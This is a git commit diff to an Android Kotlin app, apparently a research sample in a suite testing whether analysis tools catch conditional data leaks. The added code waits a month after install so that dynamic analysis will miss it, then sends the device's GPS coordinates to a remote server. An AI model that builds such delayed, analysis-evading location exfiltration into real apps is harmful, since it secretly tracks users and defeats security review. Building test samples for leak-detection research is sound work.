0fcc9031fc4d3d7389a902172bcb0ba69d15ea75
Timme Bethe <timme@timmebethe.nl>
2021-06-03 11:04:01 +0200

    Implemented actual leaking in WaitAfterFirstStartup
    - Updated all dependencies
    - Added leaking location

--- conditional-leaking/WaitAfterFirstStartup/app/src/main/java/nl/tbethe/shadowdroid/waitafterfirststartup/MainActivity.kt
+++ conditional-leaking/WaitAfterFirstStartup/app/src/main/java/nl/tbethe/shadowdroid/waitafterfirststartup/MainActivity.kt
@@ -1,10 +1,23 @@
 package nl.tbethe.shadowdroid.waitafterfirststartup
 
+import android.Manifest
 import android.content.SharedPreferences
+import android.content.pm.PackageManager
+import android.location.Criteria
+import android.location.LocationManager
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
 import android.widget.TextView
+import androidx.activity.result.contract.ActivityResultContracts
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.request.forms.*
+import io.ktor.client.statement.*
+import io.ktor.http.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import java.time.Instant
 import java.time.LocalDateTime
 import java.time.ZoneOffset
@@ -28,9 +41,52 @@ class MainActivity : AppCompatActivity() {
         Log.d(TAG, "Leaking after: $monthAfterInstall")
 
         // Leak 1 month after install, because dynamic analysis would never test for this long.
-        if ( currentTime.after(monthAfterInstall) ) {
-            Log.d(TAG, "Leak data")
-            TODO("Leak data")
+        leakLocationIf( currentTime.after(monthAfterInstall) )
+    }
+
+    private fun leakLocationIf(notAnalyser: Boolean) {
+        if (!notAnalyser) return
+
+        fun sendLocation() {
+            val lm = getSystemService(LocationManager::class.java)
+            val provider = lm.getBestProvider(Criteria(), true)
+
+            val location = provider?.let {
+                lm.getLastKnownLocation(it)
+            }
+            location?.let { loc ->
+                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        HttpClient(CIO).use { client ->
+                            val response = client.submitForm<HttpResponse>(
+                                url,
+                                Parameters.build {
+                                    append("appname", packageName)
+                                    append("coords", "${loc.latitude}:${loc.longitude}")
+                                },
+                                false
+                            )
+                            Log.d(TAG, "Response status: ${response.status}")
+                            Log.d(TAG, "Response: ${response.readText()}")
+                        }
+                    } catch (e: Exception) {
+                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                    }
+                }
+            }
+        }
+        val requestPermission =
+            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+                if (isGranted) sendLocation()
+            }
+        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            PackageManager.PERMISSION_DENIED -> {
+                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            }
+            PackageManager.PERMISSION_GRANTED -> {
+                sendLocation()
+            }
         }
     }
 }
